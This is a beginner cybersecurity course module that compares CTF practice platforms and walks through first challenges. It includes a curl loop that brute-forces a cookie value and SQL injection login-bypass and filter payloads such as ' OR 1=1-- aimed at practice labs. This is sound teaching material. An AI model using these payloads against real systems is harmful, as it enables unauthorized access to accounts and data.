# 06-2 · CTF Platforms & First Challenge

> **Level:** Beginner · **Prerequisites:** [06-1 What are CTFs?](01_what_are_ctfs.md)
> **Time:** ~1 hour · **Verified:** 2026-06-25 (platform overview)

---

## Why this matters

Each platform has a different learning model. Picking the right one first matters — starting with a platform too hard for your level is discouraging; starting too easy means you're not learning. This module maps where you are to where each platform fits.

---

## Platform comparison

| Platform | Best for | Format | Cost |
|---|---|---|---|
| **PicoCTF** | Absolute beginners | Jeopardy (permanent archive) | Free |
| **TryHackMe** | Guided learning (courses + labs) | Guided rooms + CTFs | Free / $14/mo |
| **Hack The Box** | Intermediate–Advanced | Boot-to-root machines + Jeopardy | Free / $14/mo |
| **CTFtime.org** | Finding live competitions | Tracks upcoming events | Free |
| **PortSwigger Web Academy** | Web app security only | Guided labs | Free |

**Recommended progression:**
1. PicoCTF (start here — very beginner-friendly)
2. TryHackMe (structured learning rooms)
3. PortSwigger Web Academy (deep web security)
4. Hack The Box (when you're comfortable with TryHackMe)

---

## Platform 1: PicoCTF

PicoCTF is run by Carnegie Mellon University. Their challenge archive (picoCTF 2024 and earlier) is permanently available and has excellent beginner-level Web challenges.

**How to start:**
1. Register at `play.picoctf.org`
2. Go to Practice → Web Exploitation
3. Start with any 100 or 200-point challenge

**Example Web challenge: "Cookies"**

Premise: A website sets a cookie with a numeric value and changes the response based on it. Find the right cookie value.

```bash
# Step 1: send a request and look at the cookie
curl -v http://mercury.picoctf.net:64944/ 2>&1 | grep -i "set-cookie"
# Set-Cookie: name=-1

# Step 2: try different values
for i in 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do
  RESULT=$(curl -s -b "name=$i" http://mercury.picoctf.net:64944/ | grep -o "picoCTF{.*}")
  if [ ! -z "$RESULT" ]; then
    echo "Found flag with cookie $i: $RESULT"
    break
  fi
done
```

This is the CTF mentality: probe, iterate, observe.

---

## Platform 2: TryHackMe

TryHackMe has "rooms" — guided walkthroughs that teach a specific skill. The free tier gives access to most rooms.

**Recommended beginner path:**
1. **Pre-Security** (free path) — networking, web basics, Linux: 40 hours
2. **Jr Penetration Tester** (free path) — follows directly from this course: 64 hours
3. **Web Fundamentals** — hands-on web app security

**How a room works:**
1. Start the room → deploy a VM
2. Read the theory, answer the questions (flags are in the deployed VM)
3. Flag format: `THM{...}`

The first room to try: "OWASP Top 10 - 2021" — it covers all 10 categories with hands-on machines for each.

---

## Platform 3: PortSwigger Web Academy

The team behind Burp Suite built a free web security course with 250+ labs. Every OWASP category has multiple labs ranging from Apprentice to Expert. This is the best free resource for deep web security.

**How it works:**
1. Go to `portswigger.net/web-security`
2. Pick a vulnerability class (SQL injection → Apprentice)
3. Launch the lab — it gives you a URL
4. Intercept with Burp Suite, find and exploit the vulnerability
5. Flag is submitting the exploit

**Starting labs from this course:**
- SQL injection → "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data" (Apprentice)
- XSS → "Reflected XSS into HTML context with nothing encoded" (Apprentice)
- Access control → "User role can be modified in user profile" (Apprentice)

---

## First challenge walkthrough: SQLi login bypass (PicoCTF style)

This walks through the kind of reasoning a CTF challenge requires — similar to what you did in the lab.

**Challenge premise:** "Login to the admin account at `http://challenge.ctf.local/login`"

```mermaid
flowchart TD
    A[Read the challenge] --> B[Identify: it's a login form]
    B --> C[Try default creds: admin/admin, admin/password]
    C --> D{Works?}
    D -- No --> E[Try SQL injection: ' OR '1'='1' --]
    E --> F{Works?}
    F -- Yes --> G[Get the flag from the dashboard]
    F -- No --> H[Try error-based: ' -- / ' # / ') OR 1=1 --]
    H --> F
```

```bash
# Step 1: try normal credentials
curl -s -X POST http://challenge.ctf.local/login \
  -d "username=admin&password=admin"

# Step 2: try SQLi (URL-encode the payload for form data)
curl -s -X POST http://challenge.ctf.local/login \
  -d "username=%27+OR+%271%27%3D%271+--&password=x"

# Step 3: if successful, look for the flag in the response
# Usually displayed as: FLAG{...} or picoCTF{...} or THM{...}
```

---

## Exercises

1. **Register on PicoCTF.** Go to `play.picoctf.org`, create an account, and solve the "Insp3ct0r" challenge (Web Exploitation, 50 points) using only your browser's developer tools.

<details>
<summary>Hint</summary>

"Insp3ct0r" means: open the browser developer tools (F12) and look at the page source, CSS, and JavaScript files. The flag is split across three files. `picoCTF{` starts in the HTML source, continues in the CSS, ends in the JavaScript.

</details>

2. **Explore TryHackMe.** Create a free account at TryHackMe, find the "OWASP Top 10 - 2021" room, and complete Day 1 (Broken Access Control). Write down the flag.

3. **PortSwigger first lab.** At portswigger.net/web-security, open the SQL injection apprentice lab "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data." Use the URL parameter to inject and retrieve hidden products. What SQL payload unlocks all items?

<details>
<summary>Solution</summary>

The URL parameter for category filtering is injectable. Payload:
```
/filter?category=' OR 1=1--
```
This changes the WHERE clause to `WHERE category='' OR 1=1--` — returns all products including "unreleased" ones. The lab marks as complete when you find the hidden item.

</details>

---

## Recap & next

- ✅ PicoCTF: permanent beginner archive — start here
- ✅ TryHackMe: guided rooms for structured learning
- ✅ PortSwigger Web Academy: best free deep-dive into web vulns
- ✅ CTF problem-solving: read, identify vulnerability class, probe, iterate
- ✅ First real challenge: match the technique to the symptom

**→ Next: [03 Career paths](03_career_paths.md)**
